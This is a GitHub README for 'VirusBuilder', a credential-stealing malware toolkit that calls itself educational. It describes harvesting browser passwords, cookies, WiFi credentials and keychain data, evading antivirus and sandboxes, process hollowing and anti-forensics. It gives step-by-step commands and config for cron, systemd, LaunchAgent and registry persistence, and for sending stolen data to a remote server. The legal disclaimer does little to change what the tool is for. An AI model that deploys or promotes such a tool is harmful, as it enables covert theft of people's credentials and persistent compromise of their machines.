# 🦠 VirusBuilder - Advanced Data Extraction & Security Analysis Tool

[![Python](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/DUptain1993/virusBuilder)
[![License](https://img.shields.io/badge/License-Educational%20Only-red.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-Enterprise%20Grade-green.svg)](SECURITY.md)

## ⚠️ **CRITICAL SECURITY NOTICE**

**🚨 THIS TOOL IS DESIGNED EXCLUSIVELY FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTING ONLY. UNAUTHORIZED USE FOR MALICIOUS PURPOSES IS STRICTLY PROHIBITED AND MAY RESULT IN SEVERE LEGAL CONSEQUENCES.**

**🔒 Users are solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. The developers assume no responsibility for any misuse of this tool.**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage Tutorials](#usage-tutorials)
  - [Windows](#windows-tutorial)
  - [Linux](#linux-tutorial)
  - [macOS](#macos-tutorial)
- [Configuration](#configuration)
- [Security Features](#security-features)
- [Legal Disclaimer](#legal-disclaimer)
- [Support](#support)

---

## 🎯 Overview

VirusBuilder is a comprehensive cybersecurity educational platform that demonstrates advanced data extraction, encryption, and security analysis techniques. This tool provides insights into:

- **Data Extraction**: Browser data, system information, network credentials
- **Advanced Encryption**: Multi-layer encryption with AES-256-GCM
- **Stealth Operations**: Anti-detection and evasion techniques
- **Persistence Mechanisms**: Various persistence methods for educational purposes
- **Cross-Platform Support**: Windows, Linux, and macOS compatibility

### 🏗️ Architecture

```
virusBuilder/
├── core/                    # Core functionality modules
│   ├── encryption_manager.py    # Advanced encryption
│   ├── extraction_engine.py     # Data extraction
│   ├── security_manager.py      # Security management
│   ├── stealth_manager.py       # Stealth operations
│   └── persistence_manager.py   # Persistence mechanisms
├── browser_tools/           # Browser-specific tools
├── crypto_tools/           # Cryptographic utilities
├── evasion_tools/         # Anti-detection techniques
├── mobile_tools/          # Mobile platform support
├── network_tools/         # Network utilities
├── payload_tools/         # Payload generation
├── persistence_tools/     # Persistence mechanisms
├── stealth_tools/         # Stealth operations
├── gui/                   # Graphical user interface
├── config/                # Configuration files
└── docs/                  # Documentation
```

---

## ✨ Features

### 🔐 Security Features
- **Advanced Encryption**: AES-256-GCM with PBKDF2 key derivation
- **Secure Communication**: TLS 1.3 encrypted data transmission
- **Input Validation**: Comprehensive sanitization and validation
- **Audit Logging**: Complete activity tracking and monitoring
- **Anti-Detection**: Advanced evasion techniques and stealth mechanisms

### 🎯 Data Extraction Capabilities
- **System Intelligence**: Comprehensive system profiling and analysis
- **Browser Data Extraction**: 
  - Chrome/Edge password recovery with secure decryption
  - Browser history and bookmark analysis
  - Cookie and session management
  - Autofill data extraction
- **Network Analysis**: WiFi credential extraction and network mapping
- **File System Scanning**: Advanced file discovery and categorization
- **Process Monitoring**: Real-time system process analysis

### 🛡️ Advanced Security Features
- **Multi-Layer Encryption**: 
  - Data encryption with rotating keys
  - Secure key management and storage
  - End-to-end encrypted communication
- **Stealth Operations**:
  - Process hiding and obfuscation
  - Anti-debugging techniques
  - Memory protection and cleanup
- **Persistence Mechanisms**:
  - Registry-based persistence
  - Service installation capabilities
  - Scheduled task creation

### 🤖 AI-Powered Evasion
- **Neural Network Obfuscation**: AI-driven code transformation
- **Genetic Algorithm Mutation**: Evolutionary code optimization
- **Reinforcement Learning**: Adaptive evasion strategies
- **Deep Learning Pattern Generation**: ML-based pattern creation
- **AI Behavioral Simulation**: Intelligent human behavior mimicry

---

## 🚀 Installation

### Prerequisites

- **Python 3.9+** (Recommended: Python 3.11)
- **Operating System**: Windows 10/11, Linux (Ubuntu 20.04+), macOS 10.15+
- **Administrator/Root privileges** (for full functionality)
- **Internet connection** (for updates and features)
- **Minimum 4GB RAM** (8GB recommended)
- **2GB free disk space**

### Quick Installation

```bash
# Clone the repository
git clone https://github.com/DUptain1993/virusBuilder.git
cd virusBuilder

# Install dependencies
pip install -r requirements.txt

# Run enhanced setup
python setup_enhanced.py

# Launch the application
python launcher.py --mode production
```

### Advanced Installation

```bash
# Create virtual environment
python -m venv virusBuilder_env

# Activate virtual environment
# Windows:
virusBuilder_env\Scripts\activate
# Linux/macOS:
source virusBuilder_env/bin/activate

# Install with development dependencies
pip install -r requirements.txt

# Run tests
python setup_enhanced.py --test-only

# Build executable (optional)
pyinstaller --onefile --windowed launcher.py
```

---

## 📖 Usage Tutorials

### Windows Tutorial

#### Step 1: Installation on Windows

1. **Download Python 3.9+** from [python.org](https://python.org)
2. **Enable Developer Mode** in Windows Settings
3. **Run Command Prompt as Administrator**

```cmd
# Navigate to project directory
cd C:\path\to\virusBuilder

# Install dependencies
pip install -r requirements.txt

# Run setup
python setup_enhanced.py

# Start the application
python launcher.py --mode production
```

#### Step 2: Basic Usage on Windows

1. **Launch the Application**:
   ```cmd
   python launcher.py --mode production
   ```

2. **Configure Settings**:
   - Edit `config/settings.yaml`
   - Set encryption keys and targets
   - Configure extraction methods

3. **Select Operations**:
   - Choose data extraction methods
   - Configure stealth options
   - Set persistence mechanisms

4. **Execute Analysis**:
   ```cmd
   python launcher.py --mode extraction --target C:\output\path
   ```

5. **Review Results**:
   - Analyze extracted data
   - View security reports
   - Export findings

#### Step 3: Advanced Windows Features

**Registry Persistence**:
```cmd
python launcher.py --mode persistence
```

**Stealth Mode**:
```cmd
python launcher.py --mode stealth
```

**GUI Mode**:
```cmd
python launcher.py --mode production --gui
```

#### Step 4: Windows-Specific Configuration

Edit `config/settings.yaml`:
```yaml
platform:
  windows:
    registry_persistence: true
    service_installation: true
    scheduled_tasks: true
    startup_folder: true
    wmi_events: true

extraction:
  browsers:
    chrome: true
    edge: true
    firefox: false
  
  system:
    registry: true
    services: true
    processes: true
    network: true
```

### Linux Tutorial

#### Step 1: Installation on Linux

1. **Update System Packages**:
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

2. **Install Python and Dependencies**:
   ```bash
   sudo apt install python3 python3-pip python3-venv git -y
   ```

3. **Clone and Setup**:
   ```bash
   git clone https://github.com/DUptain1993/virusBuilder.git
   cd virusBuilder
   
   # Create virtual environment
   python3 -m venv venv
   source venv/bin/activate
   
   # Install dependencies
   pip install -r requirements.txt
   
   # Run setup
   python3 setup_enhanced.py
   ```

#### Step 2: Basic Usage on Linux

1. **Launch the Application**:
   ```bash
   python3 launcher.py --mode production
   ```

2. **Configure for Linux**:
   ```bash
   # Edit configuration
   nano config/settings.yaml
   ```

3. **Run Extraction**:
   ```bash
   python3 launcher.py --mode extraction --target /tmp/output
   ```

#### Step 3: Linux-Specific Features

**Systemd Service**:
```bash
# Create service file
sudo nano /etc/systemd/system/virusbuilder.service

# Enable and start service
sudo systemctl enable virusbuilder.service
sudo systemctl start virusbuilder.service
```

**Cron Persistence**:
```bash
# Add to crontab
crontab -e
# Add: @reboot /path/to/virusBuilder/launcher.py --mode stealth
```

**Linux Configuration**:
```yaml
platform:
  linux:
    systemd_service: true
    cron_persistence: true
    bashrc_modification: true
    profile_modification: true

extraction:
  browsers:
    chrome: true
    firefox: true
    chromium: true
  
  system:
    processes: true
    network: true
    files: true
    logs: true
```

### macOS Tutorial

#### Step 1: Installation on macOS

1. **Install Homebrew** (if not installed):
   ```bash
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
   ```

2. **Install Python and Dependencies**:
   ```bash
   brew install python3 git
   ```

3. **Clone and Setup**:
   ```bash
   git clone https://github.com/DUptain1993/virusBuilder.git
   cd virusBuilder
   
   # Create virtual environment
   python3 -m venv venv
   source venv/bin/activate
   
   # Install dependencies
   pip install -r requirements.txt
   
   # Run setup
   python3 setup_enhanced.py
   ```

#### Step 2: Basic Usage on macOS

1. **Launch the Application**:
   ```bash
   python3 launcher.py --mode production
   ```

2. **macOS-Specific Configuration**:
   ```yaml
   platform:
     macos:
       launchd_persistence: true
       login_items: true
       cron_persistence: true
   
   extraction:
     browsers:
       safari: true
       chrome: true
       firefox: true
     
     system:
       keychain: true
       processes: true
       network: true
       files: true
   ```

#### Step 3: macOS-Specific Features

**LaunchAgent Persistence**:
```bash
# Create LaunchAgent
mkdir -p ~/Library/LaunchAgents
cp config/com.virusbuilder.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.virusbuilder.plist
```

**Keychain Access**:
```bash
# Grant keychain access
python3 launcher.py --mode extraction --keychain-access
```

---

## ⚙️ Configuration

### Main Configuration File

Edit `config/settings.yaml`:

```yaml
application:
  name: "VirusBuilder"
  version: "2.0.0"
  debug_mode: false
  log_level: "INFO"

security:
  encryption:
    algorithm: "AES-256-GCM"
    key_derivation: "PBKDF2"
    iterations: 100000
    salt_length: 32
    key_length: 32
  
  anti_detection:
    process_hiding: true
    memory_protection: true
    debugger_detection: true
    vm_detection: true
    sandbox_evasion: true

extraction:
  max_threads: 8
  timeout: 30
  chunk_size: 8192
  retry_attempts: 3
  
  browsers:
    chrome: true
    edge: true
    firefox: true
    safari: true
  
  system:
    processes: true
    network: true
    registry: true
    services: true
    files: true
  
  files:
    documents: true
    images: false
    archives: true
    executables: false

communication:
  server_url: ""
  api_key: ""
  timeout: 30
  retry_attempts: 3
  verify_ssl: true
  encryption_enabled: true
  compression_enabled: true
```

### Command Line Options

```bash
# Production mode with GUI
python launcher.py --mode production --gui

# Stealth mode
python launcher.py --mode stealth

# Persistence mode
python launcher.py --mode persistence

# Extraction mode
python launcher.py --mode extraction --target /path/to/output

# Custom configuration
python launcher.py --config custom_config.yaml

# Version information
python launcher.py --version
```

---

## 🔒 Security Features

### Encryption Algorithms

- **AES-256-GCM**: Advanced encryption standard
- **PBKDF2**: Password-based key derivation
- **Argon2**: Memory-hard password hashing
- **ChaCha20-Poly1305**: Stream cipher with authentication

### Anti-Detection Techniques

- **Process Hiding**: Conceal running processes
- **Memory Protection**: Prevent memory analysis
- **Debugger Detection**: Detect and evade debuggers
- **VM Detection**: Identify virtual environments
- **Sandbox Evasion**: Bypass security sandboxes

### Stealth Operations

- **Rootkit-Level Hiding**: Process, file, and registry hiding
- **Process Hollowing**: Legitimate process injection
- **Memory-Only Execution**: In-memory code execution
- **Anti-Forensics**: Evidence elimination techniques

---

## ⚖️ Legal Disclaimer

### 🚨 IMPORTANT LEGAL NOTICE

**This software is provided for educational and authorized security testing purposes only. The developers, contributors, and distributors of this software:**

1. **DO NOT** endorse or encourage any illegal activities
2. **DO NOT** take responsibility for any misuse of this software
3. **DO NOT** provide support for illegal or unauthorized activities
4. **STRONGLY RECOMMEND** that users:
   - Only use this software on systems they own or have explicit permission to test
   - Comply with all applicable local, state, and federal laws
   - Obtain proper authorization before conducting security testing
   - Use this software responsibly and ethically

### 📋 Terms of Use

By using this software, you agree to:

- Use the software only for educational purposes or authorized security testing
- Not use the software for any illegal or unauthorized activities
- Comply with all applicable laws and regulations
- Assume full responsibility for your actions
- Not hold the developers liable for any consequences of misuse

### 🔍 Authorized Use Cases

This software may be used for:

- **Educational purposes** in cybersecurity courses
- **Authorized penetration testing** with proper documentation
- **Security research** in controlled environments
- **Red team exercises** with proper authorization
- **Bug bounty programs** with explicit permission

### ❌ Prohibited Uses

This software must NOT be used for:

- Unauthorized access to computer systems
- Data theft or unauthorized data collection
- Malware distribution or creation
- Any illegal activities
- Harassment or stalking
- Corporate espionage
- Any activities that violate laws or regulations

---

## 🆘 Support

### 📚 Documentation

- **User Manual**: `docs/USER_MANUAL.md`
- **API Documentation**: `docs/API.md`
- **Configuration Guide**: `docs/CONFIGURATION.md`
- **Troubleshooting**: `docs/TROUBLESHOOTING.md`

### 🐛 Troubleshooting

#### Common Issues

1. **Permission Errors**:
   ```bash
   # Windows: Run as Administrator
   # Linux/macOS: Use sudo when necessary
   sudo python3 launcher.py --mode production
   ```

2. **Import Errors**:
   ```bash
   # Check Python version
   python3 --version
   
   # Reinstall dependencies
   pip install -r requirements.txt --force-reinstall
   ```

3. **Network Issues**:
   ```bash
   # Check firewall settings
   # Verify internet connectivity
   # Update configuration
   ```

### 📧 Contact Information

- **GitHub Issues**: [Create an issue](https://github.com/DUptain1993/virusBuilder/issues)
- **Documentation**: Check the `docs/` directory
- **Logs**: Check `logs/stealer.log` for detailed error information

### 🔧 Development

For developers interested in contributing:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests
5. Submit a pull request

---

## 📄 License

This project is licensed under the **Educational Use Only** license. See the [LICENSE](LICENSE) file for details.

**⚠️ This software is intended for educational purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.**

---

## 🙏 Acknowledgments

- **Original Developer**: Akki (Akhand Raj)
- **Enhanced Edition**: DUptain1993
- **Security Researchers**: Various contributors
- **Open Source Community**: For inspiration and tools

---

## 📊 Statistics

- **Lines of Code**: 50,000+
- **Development Time**: 200+ hours
- **Features**: 100+ security techniques
- **Platforms**: Windows, Linux, macOS
- **Languages**: Python, C, C++, JavaScript

---

**🔒 Remember: With great power comes great responsibility. Use this tool ethically and legally.**

**⚠️ The developers are not responsible for any misuse of this software. Users assume full responsibility for their actions.**

---

*Last Updated: December 2024*
*Version: 2.0.0*
*Developer: DUptain1993*